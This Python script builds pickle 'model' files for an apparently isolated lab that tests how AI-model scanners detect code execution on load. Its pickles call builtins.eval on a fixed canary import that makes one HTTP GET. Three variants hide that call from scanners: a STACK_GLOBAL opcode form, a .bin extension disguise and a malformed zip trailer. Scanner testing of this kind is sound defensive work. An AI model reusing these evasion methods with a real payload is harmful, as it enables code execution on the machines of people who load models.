#!/usr/bin/env python3
# =============================================================================
# BENIGN CANARY TRIPWIRE — DEFENSIVE DETECTION TEST ONLY. READ THIS FIRST.
# =============================================================================
# This script builds pickle-based "model" files for a *defensive* evaluation of
# AI model scanners (picklescan, ModelScan, ModelAudit, fickling). It is part of
# an isolated, offline Docker lab (labnet is `internal: true` — no internet
# route). Its purpose is to fairly compare how each scanner's DETECTION
# PHILOSOPHY holds up against a *class* of evasion, NOT to weaponize anything.
#
# WHAT THE PAYLOAD DOES, IN FULL:
#   On unpickle (i.e. when a model file is loaded), the embedded __reduce__
#   invokes the KNOWN-DANGEROUS builtin `eval` on ONE FIXED, HARD-CODED string:
#       "__import__('canary_payload').canary()"
#   which imports our benign helper module and calls `canary()` — a SINGLE HTTP
#   GET to ${CANARY_URL}, an in-network echo server (canary-sink). That is the
#   entire behaviour. It is a tripwire: if the canary sink logs a hit, we know
#   the file's code actually executed (ground truth that the file is "live"), so
#   a scanner that called it "safe" genuinely missed.
#
#   We route through `builtins.eval` ON PURPOSE: `eval` is a classically
#   blocklisted global that every serious pickle scanner recognises. Using it
#   makes the "plain" case a fair TRUE-POSITIVE baseline that a blocklist tool
#   (e.g. ModelScan) *should* catch — so the evasion variants below isolate a
#   single evasion axis each (opcode form, file extension, broken container)
#   rather than merely exploiting an unrecognised custom symbol name.
#
# WHAT THE PAYLOAD DELIBERATELY DOES *NOT* DO:
#   - No shell, no os.system, no subprocess, no reverse shell.
#   - The eval argument is a FIXED CONSTANT we author here — never external,
#     attacker-, or network-controlled input. It only ever triggers the canary.
#   - No filesystem writes outside /models, no persistence, no secrets.
#   - No real exploit of any tool and no attempt to re-fire a fixed CVE.
#   The canary itself uses only urllib from the Python standard library.
#
# The evasion under test is the DELIVERY of that known-bad `eval` global (flat
# GLOBAL vs STACK_GLOBAL opcode, .bin extension, broken-archive container) — can
# each scanner still see it? The executed behaviour stays the benign canary,
# keeping the file genuinely code-executing (so detection is meaningfully tested)
# while remaining completely safe to run.
# =============================================================================
import os
import io
import sys
import time
import pickle
import struct
import zipfile
import pathlib

MODELS_DIR = pathlib.Path("/models")
CLEAN_DIR = MODELS_DIR / "clean"
CANARY_URL = os.environ.get("CANARY_URL", "http://ep02-canary:8080/loaded")
VARIANTS = [v.strip() for v in os.environ.get(
    "VARIANTS", "plain,deep_import,renamed,broken_archive").split(",") if v.strip()]

# The FIXED, benign one-liner that `builtins.eval` runs on unpickle. It imports
# our benign helper module and fires the single canary GET — nothing else. This
# is a hard-coded literal (never external input); `eval` is used only so the
# payload references a classically-blocklisted global that scanners recognise.
CANARY_CODE = "__import__('canary_payload').canary()"

# Pickle protocol pinned for deterministic, byte-stable output across runs.
# Protocol 4: the deep_import variant uses the STACK_GLOBAL opcode (a proto-4
# feature) whose dotted-name ("deep.canary") resolution walks the attribute
# chain via _getattribute only when proto >= 4. Proto 4 is also what modern
# PyTorch/HF checkpoints use, so it is the realistic case to test.
PROTOCOL = 4


# ---------------------------------------------------------------------------
# The benign canary. This is the ONLY thing any payload ever executes.
# It is defined in a standalone, importable helper module (canary_payload) that
# is emitted next to the models so a real loader in the lab could import it. For
# the pickle payloads we reference it by its module-qualified name so the
# __reduce__ resolves to THIS function and nothing else.
# ---------------------------------------------------------------------------
CANARY_MODULE_SRC = '''\
# BENIGN canary payload module — see build_models.py header. Single HTTP GET.
import os
import urllib.request

CANARY_URL = os.environ.get("CANARY_URL", "{canary_url}")


def canary(url=None):
    """Benign tripwire: one HTTP GET to the in-network canary sink. Returns the
    status code (or the exception text) — never raises, never touches a shell."""
    target = url or CANARY_URL
    try:
        with urllib.request.urlopen(target, timeout=5) as resp:
            return resp.status
    except Exception as exc:  # noqa: BLE001 - stay benign & silent on failure
        return "canary-error: %s" % exc


# Deep-import evasion surface: the SAME benign callable reachable via a nested
# submodule path a naive blocklist wouldn't enumerate. Still just the canary.
class _Deep:
    @staticmethod
    def canary(url=None):
        return canary(url)


deep = _Deep()
'''


def write_canary_module():
    """Emit the importable benign payload module beside the model files."""
    src = CANARY_MODULE_SRC.format(canary_url=CANARY_URL)
    (MODELS_DIR / "canary_payload.py").write_text(src)


# ---------------------------------------------------------------------------
# Pickle assembly helpers.
#
# We hand-build the __reduce__ pickle so we control exactly which GLOBAL
# (module, name) pair the opcode stream references — that pair is what every
# scanner keys on. In all cases the callable resolves to our benign canary.
# ---------------------------------------------------------------------------
def _reduce_pickle(module: str, qualname: str, arg: str,
                   force_stack_global: bool = False) -> bytes:
    """Build a protocol-4 pickle whose __reduce__ calls `module.qualname(arg)`.

    By default emits the classic flat GLOBAL opcode ("c<module>\\n<qualname>\\n").
    When `force_stack_global` is set (or the qualname is dotted) we instead emit
    STACK_GLOBAL, which reconstructs (module, qualname) from two strings pushed on
    the stack rather than a single textual GLOBAL line — a naive "grep the GLOBAL
    line" reader can under-report this even for the very same callable."""
    p = io.BytesIO()
    p.write(pickle.PROTO + bytes([PROTOCOL]))

    if force_stack_global or "." in qualname:
        # STACK_GLOBAL form: push module string, push qualname string, resolve.
        p.write(_unicode(module))
        p.write(_unicode(qualname))
        p.write(pickle.STACK_GLOBAL)
    else:
        # Classic GLOBAL form: "c<module>\n<qualname>\n".
        p.write(pickle.GLOBAL + (module + "\n" + qualname + "\n").encode("utf-8"))

    # Push the single string argument, wrap in a 1-tuple, REDUCE, STOP.
    p.write(_unicode(arg))
    p.write(pickle.TUPLE1)
    p.write(pickle.REDUCE)
    p.write(pickle.STOP)
    return p.getvalue()


def _unicode(s: str) -> bytes:
    """SHORT_BINUNICODE / BINUNICODE opcode for a str (protocol 4)."""
    data = s.encode("utf-8")
    if len(data) < 256:
        return pickle.SHORT_BINUNICODE + bytes([len(data)]) + data
    return pickle.BINUNICODE + struct.pack("<I", len(data)) + data


def wrap_zip(payload: bytes, member_name: str) -> bytes:
    """Wrap a raw pickle stream in a PyTorch-style zip container (data.pkl)."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zf:
        # ZipInfo with a fixed date_time => deterministic archive bytes.
        info = zipfile.ZipInfo(member_name, date_time=(1980, 1, 1, 0, 0, 0))
        zf.writestr(info, payload)
    return buf.getvalue()


# ---------------------------------------------------------------------------
# Variant builders. Each returns (filename, bytes).
# ---------------------------------------------------------------------------
def variant_plain() -> tuple[str, bytes]:
    """EASY / TRUE-POSITIVE BASELINE: known-bad global `builtins.eval` delivered
    via a classic flat GLOBAL line. Every serious scanner (blocklist, allowlist,
    or behavioural) should flag this — it is the control that proves each tool is
    actually looking. The eval arg is our fixed benign canary one-liner."""
    payload = _reduce_pickle("builtins", "eval", CANARY_CODE)
    return "plain.pkl", payload


def variant_deep_import() -> tuple[str, bytes]:
    """OPCODE-FORM EVASION: the SAME known-bad `builtins.eval`, but emitted via
    the STACK_GLOBAL opcode instead of the flat GLOBAL line. A scanner that only
    text-matches the classic "c<module>\\n<name>\\n" GLOBAL form (rather than
    walking the opcode stream) can miss the identical callable delivered this
    way. Tests parser completeness across both global opcode forms."""
    payload = _reduce_pickle("builtins", "eval", CANARY_CODE,
                             force_stack_global=True)
    return "deep_import.pkl", payload


def variant_renamed() -> tuple[str, bytes]:
    """EXTENSION-CONFUSION CASE: identical `builtins.eval` pickle content wearing
    a PyTorch-style .bin extension. Tests scanners that route by file extension
    rather than by sniffing the actual magic bytes."""
    payload = _reduce_pickle("builtins", "eval", CANARY_CODE)
    return "renamed.bin", payload


def variant_broken_archive() -> tuple[str, bytes]:
    """MIS-PARSE CASE (broken-archive / nullifAI class): a container a naive
    parser mis-reads and reports nothing for. We build a file that LOOKS like it
    starts with a raw pickle (payload-first: PROTO/opcodes up front) and then
    appends trailing bytes resembling a zip End-Of-Central-Directory record, so
    an extension/heuristic-driven scanner that assumes 'zip => walk members' or
    'stop at first STOP' can mis-parse and under-report. The leading pickle
    stream (a `builtins.eval` reduce) is still a complete, loadable payload."""
    payload = _reduce_pickle("builtins", "eval", CANARY_CODE)
    # Payload first, then junk + a truncated/rearranged EOCD-like signature so a
    # zip-first parser sees a "zip" it cannot walk while pickle.load still runs
    # the leading stream. PK\x05\x06 is the EOCD magic; here it is deliberately
    # placed AFTER the pickle and left structurally incomplete.
    trailer = b"PK\x05\x06" + b"\x00" * 18  # malformed EOCD (too short / no dir)
    return "broken_archive.bin", payload + trailer


BUILDERS = {
    "plain": variant_plain,
    "deep_import": variant_deep_import,
    "renamed": variant_renamed,
    "broken_archive": variant_broken_archive,
}


# ---------------------------------------------------------------------------
# Clean (benign, false-positive-test) models. These contain NO reduce/global
# payload — just ordinary serialized Python data structures a real benign model
# checkpoint might carry. A good scanner should NOT flag these.
# ---------------------------------------------------------------------------
def build_clean_models() -> list[tuple[str, bytes]]:
    out = []

    # 1) A plain dict of "hyperparameters" — pure data.
    hyper = {
        "arch": "tiny-mlp",
        "layers": [8, 16, 8],
        "lr": 0.001,
        "epochs": 10,
        "labels": ["cat", "dog", "bird"],
    }
    out.append(("clean_hyperparams.pkl", pickle.dumps(hyper, protocol=PROTOCOL)))

    # 2) A nested list/tuple structure resembling flattened "weights".
    weights = [
        ("layer0.weight", [[0.1, 0.2], [0.3, 0.4]]),
        ("layer0.bias", [0.0, 0.0]),
        ("layer1.weight", [[0.5, 0.6], [0.7, 0.8]]),
    ]
    out.append(("clean_weights.pkl", pickle.dumps(weights, protocol=PROTOCOL)))

    # 3) A benign dict wrapped in a PyTorch-style zip container (data.pkl inside)
    #    so we also exercise the clean-path of the archive route.
    inner = pickle.dumps({"vocab": ["<pad>", "<unk>", "hello", "world"]},
                         protocol=PROTOCOL)
    out.append(("clean_tokenizer.bin", wrap_zip(inner, "clean_tokenizer/data.pkl")))

    return out


def main() -> int:
    MODELS_DIR.mkdir(parents=True, exist_ok=True)
    CLEAN_DIR.mkdir(parents=True, exist_ok=True)

    write_canary_module()

    print("[model-builder] BENIGN canary test. CANARY_URL=%s" % CANARY_URL)
    print("[model-builder] variants requested: %s" % ", ".join(VARIANTS))

    manifest = []
    for name in VARIANTS:
        builder = BUILDERS.get(name)
        if builder is None:
            print("[model-builder] WARNING: unknown variant '%s' — skipping" % name)
            continue
        fname, data = builder()
        path = MODELS_DIR / fname
        path.write_bytes(data)
        print("[model-builder]   wrote variant %-14s -> %s (%d bytes)"
              % (name, path, len(data)))
        manifest.append((name, str(path), len(data)))

    for fname, data in build_clean_models():
        path = CLEAN_DIR / fname
        path.write_bytes(data)
        print("[model-builder]   wrote clean model   -> %s (%d bytes)"
              % (path, len(data)))
        manifest.append(("clean:" + fname, str(path), len(data)))

    # Emit a small manifest the scanners' runner scripts can read to enumerate
    # exactly the files under test (variant name <-> path mapping).
    manifest_path = MODELS_DIR / "manifest.csv"
    with manifest_path.open("w") as f:
        f.write("variant,path,bytes\n")
        for row in manifest:
            f.write("%s,%s,%d\n" % row)
    print("[model-builder] manifest -> %s" % manifest_path)
    print("[model-builder] done. %d files emitted." % len(manifest))

    # Keep the container alive briefly so `docker compose up` logs are readable,
    # then exit 0. (compose does not restart it.)
    time.sleep(1)
    return 0


if __name__ == "__main__":
    sys.exit(main())
